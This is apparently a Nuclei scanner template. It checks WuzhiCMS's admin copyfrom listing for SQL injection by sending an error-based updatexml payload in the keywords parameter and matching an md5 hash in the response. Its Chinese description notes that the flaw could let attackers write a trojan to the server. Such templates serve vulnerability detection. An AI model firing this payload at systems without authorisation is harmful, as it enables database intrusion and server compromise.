id: wuzhicms-index-sqli
info:
  name: Template Name
  author: wangzong
  severity: high
  description: Wuzhicms 内容管理系统的/core/admin/copyfrom.php $keywords参数存在SQL注入漏洞，经过身份验证的攻击者可通过该漏洞获取数据库中的信息之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
  reference:
    - http://kpanda.wiki/#/Vulnhub/W7-1%E4%BA%94%E6%8C%87-CMS-SQL?id=w7-1%e4%ba%94%e6%8c%87-cms-sql
  tags: tags
http:
  - method: GET
    path:
      - "{{BaseURL}}/wuzhicms/www/index.php?m=core&f=copyfrom&v=listing&_su=wuzhicms&_menuid=&_submenuid=&keywords=1'+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+"
      - "{{BaseURL}}/www/index.php?m=core&f=copyfrom&v=listing&_su=wuzhicms&_menuid=&_submenuid=&keywords=1'+and+updatexml(1,concat(0x7e,md5(1),0x7e),1)--+"

    matchers:
      - type: word
        part: body
        words:
          - 'c4ca4238a0b923820'
